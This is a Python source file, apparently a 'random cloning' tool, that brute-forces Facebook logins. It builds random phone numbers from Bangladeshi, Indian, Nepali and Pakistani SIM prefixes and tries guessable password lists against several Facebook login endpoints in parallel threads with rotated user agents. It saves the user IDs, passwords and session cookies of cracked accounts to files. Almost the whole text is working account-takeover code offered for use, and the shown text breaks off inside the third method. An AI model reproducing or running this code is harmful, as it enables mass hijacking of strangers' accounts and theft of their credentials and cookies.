{green}┃  ╔╦╗╔═╗═╗ ╦  ╔═╗╔═╗╔═╗╦     🔷{purple}CEO   {blue}: {yellow}MR PAPI   {green}       ┃
{green}┃   ║║║╣ ╔╩╦╝  ╠═╝╠═╣╠═╝║     🔶{purple}ADMIN {blue}: {green}DEX CYBER{green}        ┃
{green}┃  ═╩╝╚═╝╩ ╚═  ╩  ╩ ╩╩  ╩     🔷{purple}GIT   {blue}: {cyan}PAPI-777        {green} ┃
{green}┣━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━┻━━━━━━┳━━━━━━━━━━━━━━━━━┫
{green}┃TOOL : {rad}FILE✗RANDOM{green}┃   {green}VERSION {green}: {rad}2.1   {green}┃   STATUS:{rad}FREE   {green}┃
{green}╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━╝""")
#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
def PAPI_main():
    clr_logo()
    print(f" {l1} RANDOM CLONING\n {l2} CONTACT ADMIN\n {l0} EXIT\n{PAPIline}")
    chic_opsn=input(f"{b} CHOOSE AN OPTION {ekual} ")
    if chic_opsn in ['1','01','A','a']:PAPI_random()
    elif chic_opsn in ['2','02','B','b']:magi("xdg-open https://www.facebook.com/pinik.anak");PAPI_main()
    elif chic_opsn in ['0','00','O','o']:exit()
    else:print(f"\n{c} You have selected the wrong option..");time.sleep(4);PAPI_main()
#▬▭▬▭▬▭▬▭[ PAPI RANDOM ]▬▭▬▭▬▭▬▭#
def PAPI_random():
    clr_logo();print(f' {l1} BD CLONING\n {l2} INDIA CLONING\n {l3} NEPAL CLONING\n {l4} PAK CLONING\n {l0} BACK MENU\n{PAPIline}')
    option=input(f'{b} CHOOSE AN OPTION {ekual} ')
    if option in ['1','01','A','a']:PAPI_bd()
    elif option in ['2','02','B','b']:PAPI_ind()
    elif option in ['3','03','C','c']:PAPI_npl()
    elif option in ['4','04','D','d']:PAPI_pak()
    elif option in ['0','00','O','o']:PAPI_main()
    else:print(f"\n {c}You have selected the wrong option..");time.sleep(4);PAPI_random()
#▬▭▬▭▬▭▬▭[ PAPI RANDOM BD ]▬▭▬▭▬▭▬▭#
def PAPI_bd():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}017 {a}- {f}018 {a}- {f}019 {a}- {f}016{f}\n{PAPIline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{PAPIline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(8))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{PAPIline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l2} MATHOD {f}- {b}3\n{PAPIline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:PAPI_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:PAPI_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:PAPI_mthd.append("C")
    else:PAPI_mthd.append("C")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=60) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{PAPIline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],ids[:8],ids,hugu,'Bangladesh','bangladesh','@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮']
            if 'A' in PAPI_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in PAPI_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in PAPI_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
    print(f"\n{PAPIline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/PAPI-IDS/ok&cp.txt{f}\n{PAPIline}");exit()
#▬▭▬▭▬▭▬▭[ PAPI RANDOM INDIA ]▬▭▬▭▬▭▬▭#
def PAPI_ind():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}6390 {a}- {f}6354{a}- {f}9340 {a}- {f}9749\n{PAPIline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{PAPIline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{PAPIline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l2} MATHOD {f}- {b}3\n{PAPIline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:PAPI_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:PAPI_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:PAPI_mthd.append("C")
    else:PAPI_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{PAPIline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],'57575757','07860786','57575751','57273200','59039200','57575752']
            if 'A' in PAPI_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in PAPI_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in PAPI_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
    print(f"\n{PAPIline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/PAPI-IDS/ok&cp.txt{f}\n{PAPIline}");exit()
#▬▭▬▭▬▭▬▭[ PAPI RANDOM NEPAL ]▬▭▬▭▬▭▬▭#
def PAPI_npl():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}9815 {a}- {f}9814 {a}- {f}9861 {a}- {f}9840\n{PAPIline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{PAPIline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(6))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{PAPIline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l2} MATHOD {f}- {b}3\n{PAPIline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:PAPI_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:PAPI_mthd.append("B")
    elif mthd_inn in ['c','C','3','03']:PAPI_mthd.append("C")
    else:PAPI_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{PAPIline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],'nepal123']
            if 'A' in PAPI_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in PAPI_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
            elif 'C' in PAPI_mthd:sifaxxx.submit(rndm3,ids,passlist,mthd_svr,fb)
    print(f"\n{PAPIline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/PAPI-IDS/ok&cp.txt{f}\n{PAPIline}");exit()
#▬▭▬▭▬▭▬▭[ PAPI RANDOM PAKISTAN ]▬▭▬▭▬▭▬▭#
def PAPI_pak():
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}0300 {a}- {f}0340 {a}- {f}0320 {a}- {f}0330\n{PAPIline}");sim_code = input(f" {b}ENTER SIM CODE {ekual} ")
    clr_logo();print(f"{b} EXAMPLE {ekual} {f}3000 {a}- {f}5000 {a}- {f}50000 {a}- {f}99999{f}\n{PAPIline}")
    try:LiMit = int(input(f" {b}ENTER CREAK LIMIT {ekual} "))
    except ValueError:LiMit = 50000
    for number in range(LiMit):
        numx = ''.join(random.choice(string.digits) for i in range(7))
        numnx.append(numx)
    clr_logo();print(f" {l1} m.fb {f}       - {b}1\n {l2} mbasic.fb {f}  - {b}2\n {l3} free.fb {f}    - {b}3\n {l4} p.fb {f}       - {b}4\n {l5} x.fb {f}       - {b}5\n {l6} m.alpha.fb {f} - {b}6\n {l7} d.fb {f}       - {b}7\n{PAPIline}")
    mthd_svr = str(input(f" {b}CHOOSE SERVER {ekual} "))
    if mthd_svr in ['a','A','1','01']:fb="m"
    elif mthd_svr in ['b','B','2','02']:fb="mbasic"
    elif mthd_svr in ['c','C','3','03']:fb="free"
    elif mthd_svr in ['d','D','4','04']:fb="p"
    elif mthd_svr in ['e','E','5','05']:fb="x"
    elif mthd_svr in ['f','F','6','06']:fb="m.alpha"
    elif mthd_svr in ['g','G','7','07']:fb="d"
    else:fb="mbasic"
#
    clr_logo();print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n{PAPIline}")
    mthd_inn = input(f" {b}CHOOSE MATHOD {ekual} ")
    if mthd_inn in ['a','A','1','01']:PAPI_mthd.append("A")
    elif mthd_inn in ['b','B','2','02']:PAPI_mthd.append("B")
    else:PAPI_mthd.append("B")
    clr_logo()
    ckkkki=input(f" {a}Do you went show cookie (y/n): ")
    if ckkkki in ['n','N','no','NO','2']:pmsn_ckki.append(f'n')
    else:pmsn_ckki.append(f'y')
    with threadpol(max_workers=30) as sifaxxx:
        clr_logo()
        total_l = str(len(numnx))
        print(f"{b} SERVER {ekual} {fb}.fb\n{b} SIM CODE {ekual} {sim_code}\n {j}USE AIRPLANE MOOD FOR GOOD RESULT\n{PAPIline}")
        for hugu in numnx:
            ids = sim_code+hugu
            passlist = [ids[:6],ids[:7],'khan1234']
            if 'A' in PAPI_mthd:sifaxxx.submit(rndm1,ids,passlist,mthd_svr,fb)
            elif 'B' in PAPI_mthd:sifaxxx.submit(rndm2,ids,passlist,mthd_svr,fb)
    print(f"\n{PAPIline}\n{b}CREAK PROCESS HAS BEEN COMPLITE \n {b}TOTAL IDS : {b}OK-{str(len(oks))}|{c}CP-{str(len(cps))}\n {b}FILE SAVE AS : {a}sdcard/PAPI-IDS/ok&cp.txt{f}\n{PAPIline}");exit()
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 1 ]▬▭▬▭▬▭▬▭#
def rndm1(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}MR_PAPI-M1{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
            sm_mdl=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
            pro = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(sm_mdl))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            pro = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm_mdl))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            pro = "[FBAN/FB4A;FBAV/299.0.0.3.129;FBBV/357347878;FBDM/{density=2.3,width=1080,height=1450};FBLC/en_PK;FBRV/818018892;FBCR/Robi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/373.0.0.9.109;FBBV/265912334;FBDM/{density=2.5,width=1080,height=1487};FBLC/en_IN;FBRV/803072318;FBCR/Grameenphone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/308.0.0.6.107;FBBV/620908883;FBDM/{density=3.2,width=1080,height=1460};FBLC/en_GB;FBRV/266547772;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
            pro = random.choice(ugen)  
            git_fb = session.get(f"https://{fb}.facebook.com/login.php?skip_api_login=1&api_key=212500508799908&kid_directed_site=0&app_id=212500508799908&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&display=touch&locale=bn_IN&pl_dbl=0&refsrc=deprecated&_rdr").text
            logn_data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(git_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pww,'jazoest': re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
            user_info = {'Host': f'{fb}.facebook.com',
            'method': 'POST',
            'path':'/login/device-based/regular/login/?login_attempt=1&lwv=100',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',    
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6528"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?api_key=212500508799908&auth_token=aedffdb1606919704ead2d4fa891ac15&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D212500508799908%26redirect_uri%3Dhttps%253A%252F%252Fwww.codecademy.com%252Fusers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D83fb97e0-a6e7-44b6-9da5-92a7b299a035%26tp%3Dunspecified&refsrc=deprecated&app_id=212500508799908&cancel=https%3A%2F%2Fwww.codecademy.com%2Fusers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D7f6357016c49fd688fc8ee06b2a4b5afd9673ae1c32863f1%23_%3D_&lwv=100"
            PAPI_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[-OK-💜] {uid} | {pww}")
                    os.system('espeak -a 300 " Papi,  Ok,  id"')
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    open('/sdcard/PAPI-RNDM-OK-COOKIE.txt.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/PAPI-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                print(f"\r\r {c}[PAPI-CP] {uid} | {pww}")
                os.system('espeak -a 300 " ,  cp,  id"')
                open('/sdcard/PAPI-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 2 ]▬▭▬▭▬▭▬▭#
def rndm2(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}MR_PAPI-M2{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()    
            pro = random.choice(ugen)
     #     pro = random choice(bangla)
            git_fb = session.get(f"https://{fb}.facebook.com").text
            logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
            user_info = {'Host': f'{fb}.facebook.com',
            'method': 'POST',
            'path':'/login/device-based/regular/login/?login_attempt=1&lwv=100',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
    'cache-control': 'max-age=0',    
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X6528"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',}
            url = f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            PAPI_respns = session.post(url,data=logn_data, headers=user_info,allow_redirects=False).text
            login_coki=session.cookies.get_dict().keys()
            if 'c_user' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid=re.findall("c_user=(.*);xs", coki)[0]
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                respns=requests.get(ckk).text
                if 'Photoshop' in respns:
                    print(f"\r\r {b}[-OK-💜] {uid} | {pww}")
                    if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIES : {coki}\n")
                    os.system('espeak -a 300 " Papi,  Ok,  id"')
                    open('/sdcard/PAPI-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    open('/sdcard/PAPI-RNDM-OK.txt','a').write(uid+'|'+pww+'\n')
                    oks.append(uid)
                    break
                else:break
            elif 'checkpoint' in login_coki:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split('checkpoint=')[1]
                uid=re.search('%22%3A(.*?)%2C%22', str(xx)).group(1)
                print(f"\r\r {c}[PAPI-CP] {uid} | {pww}")
                os.system('espeak -a 300 " ,  cp,  id"')
                open('/sdcard/PAPI-RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass    
#▬▭▬▭▬▭▬▭[ RANDOM MATHOD - 3 ]▬▭▬▭▬▭▬▭#    
def rndm3(ids,passlist,mthd_svr,fb):
    global loop,oks,cps
    try:
        for pww in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r\r {a}[{b}MR_PAPI-M3{a}] {loop}{f}|{b}OK-{str(len(oks))}  {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()    
            pro = random.choice(ugen)
            git_fb = session.get(f"https://{fb}.facebook.com").text
